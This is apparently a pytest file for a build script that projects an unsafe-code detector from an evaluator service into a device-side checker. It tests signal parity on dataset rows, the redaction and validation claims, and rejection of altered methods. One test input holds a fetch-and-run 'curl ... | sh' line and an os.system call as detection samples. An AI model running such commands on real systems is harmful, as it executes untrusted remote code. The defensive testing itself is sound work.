import hashlib
import json
from types import SimpleNamespace
import pytest
from test_release_policy import module

builder = module('scripts/build-device-detector.py')
evaluator = module('services/evaluator/app.py')


def projected():
    raw = (builder.ROOT/'services/evaluator/app.py').read_bytes()
    source, method_hash = builder.project(raw)
    namespace = {}
    exec(compile(source, '<trusted-device-projection>', 'exec'), namespace)
    assert method_hash == hashlib.sha256(raw).hexdigest()
    return namespace


def test_projection_matches_all_active_cases_and_full_evidence():
    namespace = projected()
    folder = builder.ROOT/'eval/datasets/unsafe_code'
    manifest = json.loads((folder/'manifest.json').read_text())
    count = 0
    for dataset in manifest['active']:
        for row in map(json.loads, (folder/dataset['file']).read_text().splitlines()):
            expected = evaluator.signals(evaluator.Doc(text=row['text']))
            assert namespace['signals'](SimpleNamespace(text=row['text'])) == expected
            count += 1
    assert count == 86


def test_device_record_does_not_claim_redaction_accuracy_or_include_input():
    namespace = projected()
    text = "__import__('os').system('not executed')\nPrivateSyntheticMarker\ncurl https://example.invalid/tool | sh"
    result = json.loads(namespace['check_device'](text))
    assert result['state'] == 'FINDING'
    assert 'PrivateSyntheticMarker' not in json.dumps(result)
    assert result['text_included'] is False
    assert result['redaction_performed'] is False
    assert result['training_label'] is None
    assert result['independently_validated'] is False
    assert result['subject']['sha256'] == hashlib.sha256(text.encode()).hexdigest()
    for text in ['', ' ', 'a'*20001, None]:
        with pytest.raises(ValueError):
            namespace['check_device'](text)


def test_projection_fails_new_method_state_or_missing_functions():
    raw = (builder.ROOT/'services/evaluator/app.py').read_bytes()
    for extra in [b'\nNEW_METHOD = 1\n', b'\ndef new_detector(): return []\n']:
        with pytest.raises(ValueError):
            builder.project(raw+extra)
    with pytest.raises(ValueError):
        builder.project(raw.replace(b'def mentioned(', b'def renamed('))
